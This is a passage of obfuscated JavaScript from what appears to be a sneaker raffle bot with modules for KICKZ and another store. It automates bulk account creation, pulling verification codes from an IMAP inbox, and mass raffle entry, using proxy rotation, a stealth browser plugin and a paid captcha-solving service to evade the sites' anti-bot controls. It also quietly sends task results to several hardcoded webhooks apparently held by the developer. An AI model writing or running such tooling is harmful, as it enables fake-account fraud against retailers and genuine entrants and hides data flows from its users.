                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x4b0793['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x441ea7() + '\x20[' + _0xcb64b9['name'] + ']\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4b0793['type']('#comp_firstname', '' + _0x280f74[_0x69efb2]['FirstName']), await _0x4b0793['waitForSelector']('#comp_lastname'), await _0x4b0793['type']('#comp_lastname', '' + _0x280f74[_0x69efb2]['LastName']), await _0x4b0793['waitForSelector']('#comp_email'), await _0x4b0793['type']('#comp_email', '' + _0x280f74[_0x69efb2]['Email']), await _0x4b0793['waitForSelector']('#comp_paypalemail'), await _0x4b0793['type']('#comp_paypalemail', '' + _0x280f74[_0x69efb2]['Email']), await _0x4b0793['waitForSelector']('#comp_mobile_end'), await _0x4b0793['type']('#comp_mobile_end', '' + _0x280f74[_0x69efb2]['Phone']), await _0x4b0793['waitForSelector']('#comp_dob'), await _0x4b0793['type']('#comp_dob', '08/09/1992'), console['log'](_0x441ea7() + '\x20[' + _0xcb64b9['name'] + ']\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x280f74[_0x69efb2]['Size'] == 'RANDOM') {
                            const _0x324100 = await _0x4b0793['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2f4e34 => {
                                return _0x2f4e34['map'](_0x32bac5 => _0x32bac5['value']);
                            });
                            var _0x19e0a1 = Math['round'](Math['random']() * (_0x324100['length'] - 0x2));
                            await _0x4b0793['select']('#shoesize', _0x324100[_0x19e0a1 + 0x1]), await _0x7e80ad(0x3e8);
                        } else {
                            const _0x3a0700 = await _0x4b0793['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3ed8ad => {
                                return _0x3ed8ad['map'](_0x42fcf3 => _0x42fcf3['innerText']);
                            }), _0x58092d = await _0x4b0793['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5736a5 => {
                                return _0x5736a5['map'](_0x5a3ea7 => _0x5a3ea7['value']);
                            });
                            var _0x1b2b2b = _0x280f74[_0x69efb2]['Size'];
                            for (var _0x281fa9 = 0x1; _0x281fa9 < _0x58092d['length']; _0x281fa9++) {
                                var _0x5343bd = _0x3a0700[_0x281fa9]['split']('\x20')[0x0];
                                if (_0x5343bd == _0x1b2b2b) {
                                    await _0x4b0793['select']('#shoesize', _0x58092d[_0x281fa9]);
                                    break;
                                } else {
                                    if (_0x281fa9 + 0x1 == _0x58092d['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x4b0793['waitForSelector']('#comp_address1'), await _0x4b0793['type']('#comp_address1', _0x280f74[_0x69efb2]['Address1'] + '\x20' + _0x280f74[_0x69efb2]['HouseNumber']), await _0x4b0793['waitForSelector']('#comp_address2'), await _0x4b0793['type']('#comp_address2', '' + _0x280f74[_0x69efb2]['Address2']), await _0x4b0793['waitForSelector']('#comp_address2'), await _0x4b0793['type']('#comp_address3', '' + _0x280f74[_0x69efb2]['City']), await _0x4b0793['waitForSelector']('#comp_postcode'), await _0x4b0793['type']('#comp_postcode', '' + _0x280f74[_0x69efb2]['Zip']), console['log'](_0x441ea7() + '\x20[' + _0xcb64b9['name'] + ']\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x7e80ad(0x4b0), await _0x4b0793['click']('label#emailhold'), await _0x7e80ad(0x5dc), await _0x4b0793['click']('#preauth_tandc_email\x20>\x20label'), await _0x7e80ad(0x5dc), await _0x4b0793['click']('#submit'), await _0x4b0793['waitForSelector']('#paymentWrap'), console['log'](_0x441ea7() + '\x20[' + _0xcb64b9['name'] + ']\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20:\x20' + _0x1a235e['blue']('Awaiting\x20Paypal\x20Payment')), _0xfef8f['on']('targetcreated', async _0x45089f => {
                            if (_0x45089f['type']() === 'page') {
                                const _0x2c74db = await _0x45089f['page']();
                                async function _0x4868bf() {
                                    try {
                                        await _0x4b0793['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x19bb52 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x22aed1() {
                                    try {
                                        await _0x4b0793['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x1586d1 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x22aed1(), _0x4868bf(), await _0x7e80ad(0x493e0);
                            }
                        });
                        async function _0x2f6d35() {
                            for (let _0x5570f6 = 0x0; _0x5570f6 < 0x12c; _0x5570f6++) {
                                if (_0x1586d1 == !![]) {
                                    _0x478f6e = 'no', _0x4bdc1f(_0x280f74[_0x69efb2], _0xcb64b9), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0xcb64b9['name'] + ']\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '')
                                        try {
                                            await _0x10a0d6(_0x8702f0['webhook'], _0x1593cc['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x1593cc['succesDEVMSG']), await _0x7e80ad(0xc8);
                                    try {
                                        await _0x10a0d6(_0x355433, _0x1593cc['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x19bb52)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x7e80ad(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x7e80ad(0xbb8), await _0x4b0793['click']('.zoid-outlet'), await _0x7e80ad(0x7d0), await _0x2f6d35();
                    } catch (_0xcf2d33) {
                        console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0xcb64b9['name'] + ']\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20:\x20' + _0xcf2d33)), _0x1d6574 = '' + _0xcf2d33;
                        var _0x1fb26c = await _0x296449(_0x280f74[_0x69efb2], _0xcb64b9, 'dev', !![], _0x1d6574);
                        _0x1593cc['errorDEV'] = { 'embeds': [_0x1fb26c] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x1593cc['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0x1593cc['errorDEV']);
                    } finally {
                        _0xfef8f && _0xfef8f['close']();
                        if (_0x478f6e == 'yes' && _0x15f107 != 0x5 && _0x1d6574 != 'Size\x20Not\x20Found') {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0xcb64b9['name'] + ']\x20Task\x20' + (_0x69efb2 + 0x1) + '\x20:\x20Retrying')), _0x69efb2 = _0x69efb2 - 0x1, _0x15f107 = _0x15f107 + 0x1;
                            continue;
                        }
                        _0x478f6e == 'yes' && _0x15f107 >= 0x5 && (_0xc1caad(afew[_0x69efb2], _0xcb64b9), _0x478f6e = 'no', _0x15f107 = 0x0), console['log']('Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x951ced, _0x60848f, _0x33c9f2) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xf11ba2 = 0x0; _0xf11ba2 < _0x60848f['length']; _0xf11ba2++) {
                        const _0x32bee7 = 'https://www.kickz.com/login';
                        if (_0x5cbc20 != 'yes')
                            var _0x5cbc20 = '', _0x9aa0d6 = 0x0;
                        _0x16d703(_0x951ced['name'] + '\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20/\x20' + _0x60848f['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x60848f, _0xf11ba2);
                        var _0x23e11d = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x397af7
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x8702f0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4a89e9
                                }
                            ]
                        }];
                        const _0x38cf58 = { 'embeds': _0x23e11d };
                        var _0xf0e64c = await _0x296449(_0x60848f[_0xf11ba2], _0x951ced, 'acc', ![]);
                        const _0x15f75c = { 'succesDEVMSG': { 'embeds': [_0xf0e64c] } };
                        if (_0x60848f[_0xf11ba2]['Email'] == '' || _0x60848f[_0xf11ba2]['FirstName'] == '' || _0x60848f[_0xf11ba2]['LastName'] == '') {
                            console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x60848f[_0xf11ba2]['Password'] == '' && (_0x60848f[_0xf11ba2]['Password'] = 'JRaffles23!');
                        if (_0x8702f0['useRandomProxy'] = ![])
                            var _0x1d7fac = _0x33c9f2[_0xf11ba2]['split'](':');
                        else
                            var _0x17f4f1 = Math['round'](Math['random']() * (_0x33c9f2['length'] - 0x1)), _0x1d7fac = _0x33c9f2[_0x17f4f1]['split'](':');
                        const _0x761450 = await _0x25d1cc['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1d7fac[0x0] + ':' + _0x1d7fac[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x515750 = await _0x761450['newPage']();
                            await _0x515750['authenticate']({
                                'username': '' + _0x1d7fac[0x2],
                                'password': '' + _0x1d7fac[0x3]
                            }), console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x515750['setRequestInterception'](!![]), _0x515750['on']('request', _0x411dc1 => {
                                _0x411dc1['resourceType']() === 'image' || _0x411dc1['resourceType']() === 'font' || _0x411dc1['resourceType']() === 'media' ? _0x411dc1['abort']() : _0x411dc1['continue']();
                            }), await _0x515750['goto'](_0x32bee7), await _0x7e80ad(0xbb8), console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x515750['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x515750['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x515750['waitForSelector']('#button-register'), await _0x7e80ad(0x7d0), await _0x515750['evaluate'](() => {
                                const _0x1bd244 = document['querySelector']('#button-register');
                                _0x1bd244['click']();
                            }), console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x7e80ad(0x1388), await _0x515750['waitForSelector']('#customer_salutation'), await _0x515750['select']('#customer_salutation', 'mr'), await _0x7e80ad(0x7d0), await _0x515750['waitForSelector']('#customer_firstname'), await _0x515750['type']('#customer_firstname', '' + _0x60848f[_0xf11ba2]['FirstName']), await _0x7e80ad(0x352), await _0x515750['waitForSelector']('#customer_lastname'), await _0x515750['type']('#customer_lastname', '' + _0x60848f[_0xf11ba2]['LastName']), await _0x7e80ad(0x352), await _0x515750['type']('#email-input', '' + _0x60848f[_0xf11ba2]['Email']), await _0x7e80ad(0x352), await _0x515750['type']('#email-confirm-input', '' + _0x60848f[_0xf11ba2]['Email']), await _0x7e80ad(0x352), await _0x515750['type']('#register-password', '' + _0x60848f[_0xf11ba2]['Password']), await _0x7e80ad(0x352), await _0x515750['type']('#password-confirm', '' + _0x60848f[_0xf11ba2]['Password']), await _0x7e80ad(0x352), console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x515750['click']('#consent'), await _0x7e80ad(0x1f4);
                            const _0x4c7ab7 = await _0x515750['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x4c7ab7) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x515750['click']('#buttonRegister');
                            try {
                                await _0x515750['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x60848f[_0xf11ba2]['Email']), await _0x7e80ad(0x4b0);
                            async function _0x721d18() {
                                var _0x99a024, _0x4dde59 = ![];
                                for (var _0x281cbb = 0x0; _0x281cbb < 0x18; _0x281cbb++) {
                                    async function _0x27330c() {
                                        var _0x38378d = new _0x3602ef({
                                            'user': _0x8702f0['masterMail'],
                                            'password': _0x8702f0['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x3eb0b2(_0x48e87f) {
                                            _0x38378d['openBox']('INBOX', ![], _0x48e87f);
                                        }
                                        _0x38378d['once']('ready', function () {
                                            console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3eb0b2(function (_0x3954a2, _0x4639b6) {
                                                console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x3954a2)
                                                    throw _0x3954a2;
                                                _0x38378d['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0xc171dc, _0x3cb62c) {
                                                    if (!_0x3cb62c || !_0x3cb62c['length'])
                                                        console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x38378d['end']();
                                                    else {
                                                        var _0x88591 = _0x38378d['seq']['fetch'](_0x3cb62c, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x88591['on']('message', function (_0x33d4a6, _0x7091cc) {
                                                            var _0x4c1416 = '(#' + _0x7091cc + ')\x20';
                                                            _0x33d4a6['on']('body', function (_0x3fe534, _0x48a310) {
                                                                _0x40c426(_0x3fe534, (_0x31ff6a, _0xfed6dd) => {
                                                                    if (_0xfed6dd['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x25edc7 = _0xfed6dd['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x174e1c = _0x25edc7[0x1]['split']('<')[0x0];
                                                                        _0x99a024 = _0x174e1c;
                                                                    }
                                                                });
                                                            }), _0x33d4a6['once']('end', function () {
                                                            });
                                                        }), _0x88591['once']('error', function (_0x4a775b) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x88591['once']('end', function () {
                                                            _0x38378d['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x38378d['once']('error', function (_0x3d3ba7) {
                                            console['log'](_0x1a235e['red'](_0x3d3ba7['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x4dde59 = !![];
                                        }), _0x38378d['once']('end', async function () {
                                        }), _0x38378d['connect']();
                                    }
                                    _0x27330c(), await _0x7e80ad(0x1388);
                                    if (_0x99a024)
                                        return _0x99a024;
                                    if (_0x4dde59)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x281cbb == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x721d18(), _0x7e80ad(0x320), console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Verifying..'), await _0x515750['type']('#verificationCode', code), await _0x7e80ad(0x1f4), await _0x515750['click']('#buttonVerify'), await _0x7e80ad(0x190), await _0x515750['click']('#buttonVerify'), await _0x7e80ad(0x3e8);
                            try {
                                await _0x515750['waitForSelector']('div.b-user_greeting'), _0x5cbc20 = 'no', console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Account\x20' + _0x60848f[_0xf11ba2]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x40e0db['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x60848f[_0xf11ba2]['Email'] + ',' + _0x60848f[_0xf11ba2]['Password'] + ','), console['log'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Account\x20' + _0x60848f[_0xf11ba2]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x15f75c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x10a0d6(_0x54e762, _0x15f75c['succesDEVMSG']);
                            } catch {
                                _0x5cbc20 = 'no', console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0xa0e747) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20' + _0xa0e747)), _0x23e11d[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x23e11d[0x0]['description'] = '' + _0xa0e747, await _0x10a0d6(_0x5cf6ec, _0x38cf58), _0x5cbc20 = 'yes';
                        } finally {
                            _0x761450 && _0x761450['close']();
                            if (_0x5cbc20 == 'yes' && _0x9aa0d6 != 0x5) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x951ced['name'] + ']\x20Task\x20' + (_0xf11ba2 + 0x1) + '\x20:\x20Retrying')), _0xf11ba2 = _0xf11ba2 - 0x1, _0x9aa0d6 = _0x9aa0d6 + 0x1;
                                continue;
                            }
                            _0x5cbc20 == 'yes' && _0x9aa0d6 >= 0x5 && (_0xc1caad(_0x60848f[_0xf11ba2], _0x951ced), _0x5cbc20 = 'no', _0x9aa0d6 = 0x0), console['log']('Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x299751, _0x1ba690, _0xf626dc) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xfe193b = 0x0; _0xfe193b < _0x1ba690['length']; _0xfe193b++) {
                        var _0x187865;
                        if (_0x11ef14 != 'yes')
                            var _0x11ef14 = '', _0x4115e6 = 0x0;
                        _0x16d703(_0x299751['name'] + '\x20Task\x20' + (_0xfe193b + 0x1) + '\x20/\x20' + _0x1ba690['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7);
                        var _0x3b0657 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x397af7
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x1ba690[_0xfe193b]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x1ba690[_0xfe193b]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x8702f0['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4a89e9
                                }
                            ]
                        }], _0x4d5589 = await _0x296449(_0x1ba690[_0xfe193b], _0x299751, 'dev', ![]), _0x178bb4 = await _0x296449(_0x1ba690[_0xfe193b], _0x299751, 'pub', ![]);
                        const _0xadb0e3 = {
                            'succesDEVMSG': { 'embeds': [_0x4d5589] },
                            'succesPUBMSG': { 'embeds': [_0x178bb4] }
                        };
                        await _0x6f470f(_0x1ba690, _0xfe193b);
                        if (_0x1ba690[_0xfe193b]['Email'] == '' || _0x1ba690[_0xfe193b]['Password'] == '' || _0x1ba690[_0xfe193b]['FirstName'] == '' || _0x1ba690[_0xfe193b]['LastName'] == '') {
                            console['log'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x8702f0['useRandomProxy'] = ![])
                            var _0x166b9d = _0xf626dc[_0xfe193b]['split'](':');
                        else
                            var _0x317c40 = Math['round'](Math['random']() * (_0xf626dc['length'] - 0x1)), _0x166b9d = _0xf626dc[_0x317c40]['split'](':');
                        const _0x59a3ba = await _0x25d1cc['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x166b9d[0x0] + ':' + _0x166b9d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x48738b = await _0x59a3ba['newPage']();
                            await _0x48738b['authenticate']({
                                'username': '' + _0x166b9d[0x2],
                                'password': '' + _0x166b9d[0x3]
                            }), console['log'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x48738b['setRequestInterception'](!![]), _0x48738b['on']('request', _0x4a179b => {
                                _0x4a179b['resourceType']() === 'image' || _0x4a179b['resourceType']() === 'font' || _0x4a179b['resourceType']() === 'media' ? _0x4a179b['abort']() : _0x4a179b['continue']();
                            }), await _0x48738b['goto']('' + _0x1ba690[_0xfe193b]['Url'], { 'waitUntil': 'networkidle2' }), await _0x7e80ad(0x12c);
                            try {
                                await _0x48738b['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x48738b['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20Logging\x20in'), await _0x48738b['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x48738b['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x48738b['waitForSelector']('#username'), await _0x48738b['type']('#username', _0x1ba690[_0xfe193b]['Email']), await _0x48738b['waitForSelector']('#password'), await _0x48738b['type']('#password', _0x1ba690[_0xfe193b]['Password']), await _0x7e80ad(0x190), await _0x48738b['click']('#buttonSubmit'), await _0x48738b['waitForSelector']('div.b-user_greeting'), console['log'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20Getting\x20Product'), await _0x7e80ad(0x1f4), await _0x48738b['goto']('' + _0x1ba690[_0xfe193b]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x1ba690[_0xfe193b]['Size']);
                            let _0x3a05d1 = _0x1ba690[_0xfe193b]['Size']['replace']('.5', '\x201/2');
                            await _0x48738b['click']('button[title=\x22' + _0x3a05d1 + '\x22]'), await _0x7e80ad(0x1f4);
                            try {
                                await _0x48738b['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x7e80ad(0x12c), console['log'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x48738b['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x7e80ad(0x12c), await _0x48738b['type']('#dwfrm_raffle_addressFields_firstName', _0x1ba690[_0xfe193b]['FirstName']), await _0x7e80ad(0x12c), await _0x48738b['type']('#dwfrm_raffle_addressFields_lastName', _0x1ba690[_0xfe193b]['LastName']), await _0x7e80ad(0x12c), await _0x48738b['select']('#dwfrm_raffle_addressFields_country', _0x1ba690[_0xfe193b]['Country']), await _0x7e80ad(0x12c), await _0x48738b['type']('#dwfrm_raffle_addressFields_city', _0x1ba690[_0xfe193b]['City']), await _0x7e80ad(0x12c);
                            _0x1ba690[_0xfe193b]['Postcode'] == undefined && (_0x1ba690[_0xfe193b]['Postcode'] = _0x1ba690[_0xfe193b]['Zip']);
                            await _0x48738b['type']('#dwfrm_raffle_addressFields_postalCode', _0x1ba690[_0xfe193b]['Postcode']), await _0x7e80ad(0x12c), await _0x48738b['type']('#dwfrm_raffle_addressFields_address1', _0x1ba690[_0xfe193b]['Address1']), await _0x7e80ad(0x12c), await _0x48738b['type']('#dwfrm_raffle_addressFields_address2', _0x1ba690[_0xfe193b]['HouseNumber']), await _0x7e80ad(0x12c), await _0x48738b['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x1ba690[_0xfe193b]['Address2']), await _0x7e80ad(0x12c), await _0x48738b['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x7e80ad(0x12c), await _0x48738b['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x1ba690[_0xfe193b]['Follower']), await _0x7e80ad(0x1f4), await _0x48738b['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x7e80ad(0x1f4), console['log'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20' + _0x1a235e['blue']('Awaiting\x20Paypal\x20Payment')), await _0x48738b['click']('.b-paypal_button');
                            try {
                                await _0x48738b['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x11ef14 = 'no', _0x4bdc1f(_0x1ba690[_0xfe193b], _0x299751), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0xadb0e3['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0xadb0e3['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x355433, _0xadb0e3['succesPUBMSG']);
                            } catch (_0x1eac12) {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x1eac12)), _0x187865 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x1eac12;
                                var _0x4c716f = await _0x296449(_0x1ba690[_0xfe193b], _0x299751, 'dev', !![], _0x187865);
                                _0xadb0e3['errorDEV'] = { 'embeds': [_0x4c716f] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0xadb0e3['errorDEV']), await _0x10a0d6(_0x5cf6ec, _0xadb0e3['errorDEV']);
                            }
                        } catch (_0x7f695a) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x299751['name'] + ']\x20Task\x20' + (_0xfe193b + 0x1) + '\x20:\x20' + _0x7f695a)), _0x187865 = '' + _0x7f695a;
                            var _0x4c716f = await _0x296449(_0x1ba690[_0xfe193b], _0x299751, 'dev', !![], _0x187865);
